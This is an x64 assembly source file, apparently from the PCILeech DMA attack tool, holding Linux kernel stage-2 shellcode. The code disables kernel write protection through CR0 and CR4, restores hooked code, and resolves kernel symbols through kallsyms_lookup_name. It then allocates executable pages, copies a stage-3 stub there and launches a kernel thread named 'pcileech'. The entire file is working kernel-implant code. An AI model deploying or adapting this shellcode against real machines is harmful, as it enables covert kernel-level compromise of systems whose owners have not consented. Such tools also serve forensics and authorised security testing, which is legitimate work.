; lx64_stage2.asm : assembly to receive execution from stage1 shellcode.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016-2024
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	main_pre_start:
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag					db 00h
	data_filler							db 00h
	data_phys_addr_alloc				dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code						dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_kallsyms_lookup_name	dd 00000000h						; 16 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rdi
	PUSH rsi
	PUSH rdx
	PUSH rcx
	PUSH r8
	PUSH r9
	PUSH r14
	PUSH r15
	MOV r14, cr4
	MOV r15, cr0
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rcx, cr4
	BTR ecx, 23
	MOV cr4, rcx
	MOV rcx, cr0
	BTR ecx, 16
	MOV cr0, rcx
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	MOV cr0, r15		; restore original cr0/cr4
	MOV cr4, r14		; restore original cr0/cr4
	; ----------------------------------------------------
	; 5: SET UP CALL STACK AND PARAMETERS
	;    r12: tmp 1 (virt addr)
	;    r13: tmp 2 (phys addr)
	;    r14: addr to kallsyms_lookup_name
	;    r15: storage for store old stack ptr (rsp)
	; ----------------------------------------------------
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 060h
	LEA r14, main_pre_start
	MOV eax, [data_offset_kallsyms_lookup_name]
	ADD r14, rax
	; ----------------------------------------------------
	; 5: CALL C CODE
	; ----------------------------------------------------
	CALL setup
	MOV rsp, r15
	POP r15
	POP r14
	POP r13
	POP r12
	; ----------------------------------------------------
	; 6: WRITE RESULT (KMD ADDRESS):
	; ----------------------------------------------------
	MOV rcx, cr4
	BTR ecx, 23
	MOV cr4, rcx
	MOV rcx, cr0
	BTR ecx, 16
	MOV cr0, rcx
	MOV [data_phys_addr_alloc], eax
	; ----------------------------------------------------
	; 7: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	MOV cr0, r15		; restore original cr0/cr4
	MOV cr4, r14		; restore original cr0/cr4
	POP r15
	POP r14
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	RET
main ENDP

setup PROC
	; ----------------------------------------------------
	; 0: ALLOC PAGES
	; ----------------------------------------------------
	LEA rdi, str_alloc_pages_current
	CALL r14
	TEST rax, rax
	JNZ alloc_pages_ok
	LEA rdi, str_alloc_pages
	CALL r14
	TEST rax, rax
	JNZ alloc_pages_ok
	LEA rdi, str_alloc_pages_noprof
	CALL r14
	TEST rax, rax
	JZ error
    alloc_pages_ok:
	MOV rdi, 0cc4h
	MOV rsi, 1h
	CALL rax
	MOV [rsp+30h], rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 1: RETRIEVE PHYS/VIRT ADDRESSES OF PAGES
	; ----------------------------------------------------
	MOV rdi, rax
	CALL m_page_to_phys
	MOV r13, rax
	MOV rdi, r13
	CALL m_phys_to_virt
	MOV r12, rax
	; ----------------------------------------------------
	; 2: SET MEMORY TO 'rw' IF FUNCTION EXISTS
	; ----------------------------------------------------
	LEA rdi, str_set_memory_rw
	CALL r14
	TEST rax, rax
	JZ setup_clear_memory
	MOV rdi, r12
	MOV rsi, 2
	CALL rax
	; ----------------------------------------------------
	; 3: CLEAR AND COPY STAGE3 PRE BINARY TO AREA
	; ----------------------------------------------------
	setup_clear_memory:
	MOV rdi, r12
	CALL clear_8k
	MOV rdi, 64
	copy_stage3_pre_loop:
	SUB rdi, 8
	LEA rax, lx64_stage3_pre
	MOV rax, [rax+rdi]
	MOV rsi, r12
	ADD rsi, 1000h
	ADD rsi, rdi
	MOV [rsi], rax
	TEST rdi, rdi
	JNZ copy_stage3_pre_loop
	; ----------------------------------------------------
	; 4: SET CODE PAGE TO EXECUTABLE
	; ----------------------------------------------------
	LEA rdi, str_set_memory_rox
	CALL r14
	TEST rax, rax
	JNZ set_memory_exec
	LEA rdi, str_set_memory_x
	CALL r14
	TEST rax, rax
	JZ error
	set_memory_exec:
	MOV rdi, r12
	ADD rdi, 1000h
	MOV rsi, 1
	CALL rax
	; ----------------------------------------------------
	; 5: CREATE THREAD & SET UP DATA AREA
	; (try kthread_create_on_node 1st, kthread_create 2nd)
	; ----------------------------------------------------
	LEA rdi, str_kthread_create_on_node
	CALL r14
	TEST rax, rax
	JZ thread_kthread_create
	MOV rdi, r12
	ADD rdi, 01000h
	XOR rsi, rsi
	XOR rdx, rdx
	SUB rdx, 1
	LEA rcx, str_pcileech
	CALL rax
	TEST rax, rax
	JZ thread_kthread_create
	JMP thread_start
	thread_kthread_create:
	LEA rdi, str_kthread_create
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, r12
	ADD rdi, 01000h
	XOR rsi, rsi
	LEA rdx, str_pcileech
	CALL rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 6: START THREAD
	; ----------------------------------------------------
	thread_start:
	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD[0] (task_struct*)
	MOV [r12+10h], r14   ; KMDDATA.AddrKallsymsLookupName
	MOV rax, [rsp+30h]
	MOV [r12+60h], rax   ; KMDDATA.ReservedKMD[1] (page*)
	LEA rdi, str_wake_up_process
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, [r12+58h]
	CALL rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 7: FINISH!
	;    supervisor write must be re-enabled before since
	;    some calls may have unset it.
	; ----------------------------------------------------
	MOV eax, r13d
	RET
	error:
	MOV eax, 0FFFFFFFFh
	setup_finish:
	RET
setup ENDP

; ------------------------------------------------------------------
; Retrieve the PAGE_OFFSET_BASE
; r14 -> kallsyms_lookup_name
; rax <- value of PAGE_OFFSET_BASE
; ------------------------------------------------------------------
m_page_offset_base PROC
	LEA rdi, str_page_offset_base
	CALL r14
	TEST rax, rax
	JZ kaslr_pg_disable
	MOV rax, [rax]
	RET
	kaslr_pg_disable:
	MOV rax, 0ffff880000000000h
	RET
m_page_offset_base ENDP

m_phys_to_virt PROC
	PUSH rdi
	CALL m_page_offset_base
	POP rdi
	ADD rax, rdi
	RET
m_phys_to_virt ENDP

m_vmemmap_base PROC
	LEA rdi, str_vmemmap_base
	CALL r14
	TEST rax, rax
	JZ kaslr_memmap_disable
	MOV rax, [rax]
	RET
	kaslr_memmap_disable:
	MOV rax, 0ffffea0000000000h
	RET
m_vmemmap_base ENDP

m_page_to_phys PROC
	PUSH rdi
	CALL m_vmemmap_base
	POP rdi
	SUB rdi, rax
	SHR rdi, 7		; PFN
	SHL rdi, 12
	MOV rax, rdi
	RET
m_page_to_phys ENDP

; ----------------------------------------------------
; clear_8k
; clear 8192 bytes of memory
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

; ----------------------------------------------------
; This code compiles into 53 bytes. This is copied by
; stage3 area by the setup function.
; Linux cannot use the simpler windows stage3 pre code
; since the thread will get stuck without a sleep.
; ----------------------------------------------------
lx64_stage3_pre PROC
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.qwAddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
lx64_stage3_pre ENDP

str_kthread_create			db 'kthread_create', 0
str_kthread_create_on_node	db 'kthread_create_on_node', 0
str_alloc_pages_current		db 'alloc_pages_current', 0
str_alloc_pages				db 'alloc_pages', 0
str_alloc_pages_noprof		db 'alloc_pages_noprof', 0
str_set_memory_rox			db 'set_memory_rox', 0
str_set_memory_x			db 'set_memory_x', 0
str_set_memory_rw			db 'set_memory_rw', 0
str_wake_up_process			db 'wake_up_process', 0
str_page_offset_base		db 'page_offset_base', 0
str_vmemmap_base			db 'vmemmap_base', 0
str_pcileech				db 'pcileech', 0

END
